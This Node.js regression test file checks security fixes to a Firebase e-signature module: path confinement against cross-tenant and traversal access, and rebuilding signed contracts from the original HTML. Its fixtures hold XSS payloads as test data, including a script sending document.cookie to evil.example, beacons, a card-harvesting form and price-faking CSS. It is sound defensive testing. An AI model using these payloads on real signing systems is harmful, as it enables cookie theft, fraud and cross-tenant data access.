/**
 * tests/remote-signing-record-and-path-2026-10-05.test.js
 *
 * Two holes in functions/remote-signing.js (security review, fixes approved
 * by Jo 2026-10-05):
 *
 *  A. ANY STORAGE PATH. createSignRequest copied the client-written
 *     leads/{leadId}/documents/{docId}.htmlPath into the sign token
 *     unchecked; getSignDocument downloaded whatever it named and handed it
 *     to a no-login stranger; submitSignature overwrote it. A rep could name
 *     another tenant's object (or any object in the bucket) and read or
 *     clobber it. All three now apply getDocumentHtml's confinement:
 *     documents/<uid>/<leadId>/<file>.html, the leadId segment is the
 *     token's lead, and the uid segment is in that lead's tenant.
 *
 *  B. TAMPERED EXECUTED RECORD. The integrity gate compares VISIBLE TEXT
 *     only, after dropping <script>, <style> and tags, and the submitted
 *     bytes became the record reps open. A signer could add a script, an
 *     on*= handler, a style= / <style> (CSS content: can paint a new price),
 *     an <img>/<link>/<iframe>/<object>/<form> and still pass. The record is
 *     now REBUILT from the original we served: only a validated PNG
 *     signature image per signature block is taken from the submission.
 *
 * Drives the real handlers against stubbed firebase modules (the
 * contract-cancel-forms.test.js idiom). Zero network.
 * Run: node tests/remote-signing-record-and-path-2026-10-05.test.js
 */
'use strict';

const fs = require('fs');
const path = require('path');

const ROOT = path.join(__dirname, '..');
const FN = path.join(ROOT, 'functions');

let passed = 0, failed = 0; const fails = [];
function ok(name, cond, detail) {
  if (cond) { passed++; console.log('  ✓ ' + name); }
  else { failed++; fails.push(name); console.log('  ✗ ' + name + (detail ? ' — ' + detail : '')); }
}
function section(t) { console.log('\n' + t); }

// ── harness ──────────────────────────────────────────────────────────────
function makeDb(seed) {
  const store = new Map(Object.entries(seed || {}));
  const apply = (prev, patch) => {
    const next = Object.assign({}, prev);
    for (const [k, v] of Object.entries(patch)) next[k] = (v && v.__fv) ? ('FV:' + v.__fv) : v;
    return next;
  };
  const ref = (p) => ({
    id: p.split('/').pop(), path: p,
    get: async () => { const d = store.get(p); return { exists: d !== undefined, data: () => d, ref: ref(p), id: p.split('/').pop() }; },
    set: async (patch, o) => { store.set(p, apply((o && o.merge) ? (store.get(p) || {}) : {}, patch)); },
    update: async (patch) => { if (!store.has(p)) throw new Error('NOT_FOUND ' + p); store.set(p, apply(store.get(p), patch)); },
  });
  return {
    doc: ref,
    collection: (c) => ({ add: async (d) => { store.set(c + '/auto' + store.size, d); return { id: 'auto' }; }, doc: (id) => ref(c + '/' + id) }),
    runTransaction: async (fn) => fn({ get: (r) => r.get(), update: (r, d) => { r.update(d); }, set: (r, d, o) => { r.set(d, o); } }),
    _store: store,
  };
}
function makeStorage(files) {
  const m = new Map(Object.entries(files || {}).map(([k, v]) => [k, Buffer.from(v, 'utf8')]));
  const downloads = [], saves = [];
  return {
    bucket: () => ({ file: (p) => ({
      download: async () => { downloads.push(p); if (!m.has(p)) throw new Error('no such object ' + p); return [m.get(p)]; },
      save: async (buf) => { saves.push(p); m.set(p, Buffer.from(buf)); },
    }) }),
    _files: m, downloads, saves,
  };
}
const REAL = ['./ky-insurance-law', './cancel-window', './lead-artifact-paths', 'crypto'];
function loadFn(db, storage) {
  const file = path.join(FN, 'remote-signing.js');
  class HttpsError extends Error { constructor(code, msg) { super(msg); this.code = code; } }
  const logger = { info() {}, warn() {}, error() {} };
  const stubs = {
    'firebase-functions/v2/https': { onCall: (o, h) => h, onRequest: (o, h) => h, HttpsError },
    'firebase-functions/params': { defineSecret: (n) => ({ name: n, value: () => 'stub' }) },
    'firebase-functions/v2': { logger },
    'firebase-admin/firestore': { getFirestore: () => db, Timestamp: { fromMillis: (ms) => ({ toMillis: () => ms }) },
      FieldValue: { serverTimestamp: () => ({ __fv: 'ts' }) } },
    'firebase-admin/storage': { getStorage: () => storage },
    './integrations/upstash-ratelimit': { httpRateLimit: async () => true },
    './shared': { callableRateLimit: async () => {}, assertNotViewer: () => {} },
    './estimate-view-alert': { recordEstimateView: async () => {} },
    './integrations/_shared': { secretOr: (_s, d) => d },
    './resend-guard': { resendRejected: () => false, resendErrorMessage: () => '' },
    './job-spine': { spineAfterRemoteSign: async () => ({}) },
    resend: { Resend: class { constructor() { this.emails = { send: async () => ({ data: { id: 'm1' } }) }; } } },
  };
  const req = (id) => {
    if (Object.prototype.hasOwnProperty.call(stubs, id)) return stubs[id];
    if (REAL.indexOf(id) !== -1) return require(id.charAt(0) === '.' ? path.join(FN, id) : id);
    throw new Error('unstubbed require(' + id + ')');
  };
  const mod = { exports: {} };
  new Function('module', 'exports', 'require', 'console', 'process', fs.readFileSync(file, 'utf8'))(mod, mod.exports, req, { log() {}, warn() {}, error() {} }, process);
  return mod.exports;
}
function reqRes(body) {
  const res = { statusCode: 200, body: null,
    status(c) { this.statusCode = c; return this; }, json(b) { this.body = b; return this; }, end() { return this; } };
  return { req: { method: 'POST', body, get: () => '' }, res };
}

// ── fixtures ─────────────────────────────────────────────────────────────
const PNG = 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==';
const ORIGINAL = `<!DOCTYPE html>
<html><head><meta charset="utf-8"><title>Roofing Agreement</title>
<style>.doc{font-family:serif}</style></head>
<body>
  <h1>Roofing Agreement</h1>
  <p>Prepared for <strong>Dana Whitfield</strong>.</p>
  <table><tr><td>Total</td><td>$28,400.00</td></tr></table>
  <div class="nbd-sig-block" data-nbd-sig="homeowner" data-label="Homeowner" data-required="true">
    <div class="nbd-sig-label">Homeowner</div>
    <canvas class="nbd-sig-canvas"></canvas>
    <div class="nbd-sig-controls">
      <button type="button" data-nbd-sig-action="clear">Clear</button>
      <span class="nbd-sig-state"></span>
    </div>
    <div class="nbd-sig-print-name">Print Name &amp; Date</div>
  </div>
  <script src="/pro/js/signature-widget.js"></script>
</body></html>`;

/** What the real widget produces from a served page. */
function widgetSign(html, src) {
  return html
    .replace(/<canvas class="nbd-sig-canvas"><\/canvas>/,
      `<img src="${src || PNG}" alt="Homeowner" class="nbd-sig-img" style="max-width:100%;height:auto;display:block;background:#fff;">`)
    .replace(/<div class="nbd-sig-controls">[\s\S]*?<\/span>\s*<\/div>/, '<div class="nbd-sig-date">Signed October 5, 2026</div>')
    .replace('data-nbd-sig="homeowner"', 'data-nbd-sig="homeowner" data-nbd-sig-finalized="1" data-nbd-sig-signed-at="2026-10-05T15:00:00.000Z"');
}

const GOOD_PATH = 'documents/U1/L1/d-1.html';
const VICTIM_PATH = 'documents/VICTIM/L-VICTIM/d-9.html';
const VICTIM_HTML = '<html><body><p>Victim tenant contract — $99,000</p></body></html>';

function world(extra) {
  return Object.assign({
    'leads/L1': { userId: 'U1', companyId: 'C1', firstName: 'Dana' },
    'leads/L-VICTIM': { userId: 'VICTIM', companyId: 'C-VICTIM' },
    'users/U2': { companyId: 'C1' },          // a teammate in U1's tenant
    'users/U3': { companyId: 'C-OTHER' },     // someone else's
  }, extra || {});
}
const mintCall = async (fns, uid) => {
  try { return { v: await fns.createSignRequest({ auth: { uid: uid || 'U1', token: {} }, data: { leadId: 'L1', docId: 'd1', signerEmail: 'dana@example.test' } }) }; }
  catch (e) { return { e }; }
};
const tokensIn = (db) => [...db._store.keys()].filter((k) => k.startsWith('doc_sign_tokens/'));

(async () => {
  // ══════════════════════════════════════════════════════════════════════
  section('A1. createSignRequest — htmlPath must be this lead\'s own documents/ object');
  // ══════════════════════════════════════════════════════════════════════
  const BAD = [
    ['another tenant\'s document (other lead + other uid)', VICTIM_PATH],
    ['another lead, own uid', 'documents/U1/L-VICTIM/d-9.html'],
    ['own lead, uid outside the tenant', 'documents/U3/L1/d-9.html'],
    ['a deal-room page', 'deal_rooms/VICTIM/deal-1.html'],
    ['a photo', 'photos/VICTIM/L-VICTIM/1.jpg'],
    ['path traversal', 'documents/U1/L1/../../VICTIM/L-VICTIM/d-9.html'],
    ['a nested path', 'documents/U1/L1/sub/d-9.html'],
    ['not an .html object', 'documents/U1/L1/d-9.pdf'],
    ['a non-string', { evil: true }],
  ];
  for (const [label, p] of BAD) {
    const db = makeDb(world({ 'leads/L1/documents/d1': { type: 'estimate', typeName: 'Estimate', htmlPath: p } }));
    const st = makeStorage({ [VICTIM_PATH]: VICTIM_HTML });
    const r = await mintCall(loadFn(db, st));
    ok(`refused: ${label}`, r.e && r.e.code === 'failed-precondition' && tokensIn(db).length === 0,
      r.e ? r.e.code + ' ' + r.e.message : 'minted ' + JSON.stringify(tokensIn(db)));
  }
  {
    const db = makeDb(world({ 'leads/L1/documents/d1': { type: 'estimate', typeName: 'Estimate', htmlPath: GOOD_PATH } }));
    const r = await mintCall(loadFn(db, makeStorage({ [GOOD_PATH]: ORIGINAL })));
    ok('the lead\'s own document still mints (NBD path shape)', !r.e && tokensIn(db).length === 1, r.e && r.e.message);
  }
  {
    const p = 'documents/U2/L1/d-2.html'; // generated by a teammate (generator writes the WRITER's uid)
    const db = makeDb(world({ 'leads/L1/documents/d1': { type: 'estimate', typeName: 'Estimate', htmlPath: p } }));
    const r = await mintCall(loadFn(db, makeStorage({ [p]: ORIGINAL })));
    ok('a teammate-generated document in the same tenant still mints', !r.e && tokensIn(db).length === 1, r.e && r.e.message);
  }
  {
    const p = 'documents/C1/L1/d-3.html'; // solo-tenant: companyId === owner uid shape
    const db = makeDb(world({ 'leads/L1/documents/d1': { type: 'estimate', typeName: 'Estimate', htmlPath: p } }));
    const r = await mintCall(loadFn(db, makeStorage({ [p]: ORIGINAL })));
    ok('the tenant-id uid segment still mints', !r.e && tokensIn(db).length === 1, r.e && r.e.message);
  }

  // ══════════════════════════════════════════════════════════════════════
  section('A2. getSignDocument / submitSignature re-check a token minted before the fix');
  // ══════════════════════════════════════════════════════════════════════
  {
    const db = makeDb(world({ 'doc_sign_tokens/TOKBADPATH01': { status: 'pending', leadId: 'L1', docId: 'd1', ownerUid: 'U1', htmlPath: VICTIM_PATH } }));
    const st = makeStorage({ [VICTIM_PATH]: VICTIM_HTML });
    const fns = loadFn(db, st);
    const g = reqRes({ token: 'TOKBADPATH01' });
    await fns.getSignDocument(g.req, g.res);
    ok('getSignDocument refuses a token naming another tenant\'s object',
      g.res.statusCode >= 400 && !(g.res.body && g.res.body.html), g.res.statusCode + ' ' + JSON.stringify(g.res.body).slice(0, 120));
    ok('…and never downloads it', st.downloads.indexOf(VICTIM_PATH) === -1, JSON.stringify(st.downloads));

    const s = reqRes({ token: 'TOKBADPATH01', signedHtml: widgetSign(VICTIM_HTML + ORIGINAL) });
    await fns.submitSignature(s.req, s.res);
    ok('submitSignature refuses it', s.res.statusCode >= 400, s.res.statusCode + ' ' + JSON.stringify(s.res.body));
    ok('…the victim object is neither read nor overwritten',
      st.downloads.indexOf(VICTIM_PATH) === -1 && st.saves.length === 0
      && st._files.get(VICTIM_PATH).toString('utf8') === VICTIM_HTML, JSON.stringify({ d: st.downloads, s: st.saves }));
    ok('…and the token is not burned', db._store.get('doc_sign_tokens/TOKBADPATH01').status === 'pending');
  }
  {
    const db = makeDb(world({ 'doc_sign_tokens/TOKNOPATH001': { status: 'pending', leadId: 'L1', docId: 'd1', ownerUid: 'U1', htmlPath: null } }));
    const st = makeStorage({});
    const s = reqRes({ token: 'TOKNOPATH001', signedHtml: widgetSign(ORIGINAL) });
    await loadFn(db, st).submitSignature(s.req, s.res);
    ok('a pending token with NO htmlPath fails closed (used to skip every gate and burn)',
      s.res.statusCode >= 400 && st.saves.length === 0 && db._store.get('doc_sign_tokens/TOKNOPATH001').status === 'pending',
      s.res.statusCode + ' saves=' + st.saves.length);
  }

  // ══════════════════════════════════════════════════════════════════════
  section('B. the executed record is rebuilt from the ORIGINAL');
  // ══════════════════════════════════════════════════════════════════════
  async function submit(signedHtml, original) {
    const db = makeDb(world({ 'doc_sign_tokens/TOKGOOD00001': { status: 'pending', leadId: 'L1', docId: 'd1', ownerUid: 'U1', htmlPath: GOOD_PATH } }));
    const st = makeStorage({ [GOOD_PATH]: original || ORIGINAL });
    const s = reqRes({ token: 'TOKGOOD00001', signedHtml });
    await loadFn(db, st).submitSignature(s.req, s.res);
    return { status: s.res.statusCode, body: s.res.body, record: st._files.get(GOOD_PATH).toString('utf8'),
      burned: db._store.get('doc_sign_tokens/TOKGOOD00001').status === 'signed', saves: st.saves };
  }
  const stripBlock = (h) => h.replace(/<div class="nbd-sig-block"[\s\S]*?<div class="nbd-sig-print-name">[^<]*<\/div>\s*<\/div>/, '');

  {
    const r = await submit(widgetSign(ORIGINAL));
    ok('a genuine signature is accepted', r.status === 200 && r.burned, r.status + ' ' + JSON.stringify(r.body));
    ok('…the record carries the signature image', r.record.includes('src="' + PNG + '"'));
    ok('…finalized, with the controls replaced by a signed-on stamp',
      /data-nbd-sig-finalized="1"/.test(r.record) && /class="nbd-sig-date">Signed /.test(r.record) && !/nbd-sig-controls/.test(r.record));
    ok('…and everything OUTSIDE the signature block is the original, byte for byte',
      stripBlock(r.record) === stripBlock(ORIGINAL), stripBlock(r.record).slice(0, 200));
  }

  const OUTSIDE = [
    ['a <script> block', (h) => h.replace('</h1>', '</h1><script>fetch("https://evil.example/x?c="+document.cookie)</script>'), /evil\.example/],
    ['an on*= handler', (h) => h.replace('<h1>', '<h1 onmouseover="alert(1)">'), /onmouseover/],
    ['a style= attribute (hides the real price)', (h) => h.replace('<td>$28,400.00</td>', '<td style="display:none">$28,400.00</td>'), /display:none/],
    ['a <style> block with CSS content: (paints a fake price)', (h) => h.replace('</head>', '<style>td+td::after{content:"$1.00"}</style></head>'), /content:/],
    ['an <img> beacon', (h) => h.replace('</h1>', '</h1><img src="https://evil.example/p.gif">'), /evil\.example/],
    ['a <link> stylesheet', (h) => h.replace('</head>', '<link rel="stylesheet" href="https://evil.example/s.css"></head>'), /evil\.example/],
    ['an <iframe>', (h) => h.replace('</h1>', '</h1><iframe src="https://evil.example/"></iframe>'), /<iframe/],
    ['an <object>', (h) => h.replace('</h1>', '</h1><object data="https://evil.example/x"></object>'), /<object/],
    ['a <form>', (h) => h.replace('</h1>', '</h1><form action="https://evil.example/"><input name="card"></form>'), /<form/],
  ];
  for (const [label, mut, needle] of OUTSIDE) {
    const r = await submit(mut(widgetSign(ORIGINAL)));
    ok(`${label} outside the signature block never reaches the record`,
      !needle.test(r.record), `status ${r.status}; record has it`);
  }

  const INSIDE = [
    ['a <script> inside the signature block', (h) => h.replace('<div class="nbd-sig-date">', '<script>alert(1)</script><div class="nbd-sig-date">'), /alert\(1\)/],
    ['an on*= handler on the signature image', (h) => h.replace('<img src=', '<img onerror="alert(2)" src='), /alert\(2\)/],
    ['an extra remote <img> inside the block', (h) => h.replace('<div class="nbd-sig-date">', '<img src="https://evil.example/b.gif"><div class="nbd-sig-date">'), /evil\.example/],
    ['a style= on the block', (h) => h.replace('data-nbd-sig="homeowner"', 'style="position:fixed;inset:0" data-nbd-sig="homeowner"'), /position:fixed/],
    ['forged text in the date stamp', (h) => h.replace('Signed October 5, 2026', 'Signed — PRICE AMENDED TO $1.00'), /PRICE AMENDED/],
  ];
  for (const [label, mut, needle] of INSIDE) {
    const r = await submit(mut(widgetSign(ORIGINAL)));
    ok(`${label} never reaches the record`, !needle.test(r.record), `status ${r.status}`);
  }

  {
    const r = await submit(widgetSign(ORIGINAL, 'https://evil.example/sig.png'));
    ok('a signature image that is not a PNG data URL is refused (422, token kept)',
      r.status === 422 && !r.burned && r.saves.length === 0, r.status + ' ' + JSON.stringify(r.body));
  }
  {
    const notPng = 'data:image/png;base64,' + Buffer.from('<svg onload="alert(3)"></svg>').toString('base64');
    const r = await submit(widgetSign(ORIGINAL, notPng));
    ok('base64 that does not decode to a PNG is refused (422, token kept)',
      r.status === 422 && !r.burned && r.saves.length === 0, r.status + ' ' + JSON.stringify(r.body));
  }
  {
    const two = ORIGINAL.replace('<script src=', '<div data-nbd-sig="cosigner" data-label="Co-signer"><canvas class="nbd-sig-canvas"></canvas></div>\n  <script src=');
    const r = await submit(widgetSign(ORIGINAL), two);
    ok('a submission with a signature block missing is refused (422, token kept)',
      r.status === 422 && !r.burned, r.status + ' ' + JSON.stringify(r.body));
  }
  {
    const two = ORIGINAL.replace('<script src=', '<div data-nbd-sig="cosigner" data-label="Co-signer" data-required="false"><canvas class="nbd-sig-canvas"></canvas></div>\n  <script src=');
    const r = await submit(widgetSign(two), two);
    ok('an optional block left blank stays exactly as served', r.status === 200
      && r.record.includes('<div data-nbd-sig="cosigner" data-label="Co-signer" data-required="false"><canvas class="nbd-sig-canvas"></canvas></div>'),
      r.status + ' ' + JSON.stringify(r.body));
  }

  console.log('\n' + '─'.repeat(50));
  console.log(`${passed} passed, ${failed} failed`);
  if (failed) { console.log('\nFailures:'); for (const f of fails) console.log('  - ' + f); process.exit(1); }
  process.exit(0);
})().catch((e) => { console.error('FATAL', e); process.exit(2); });
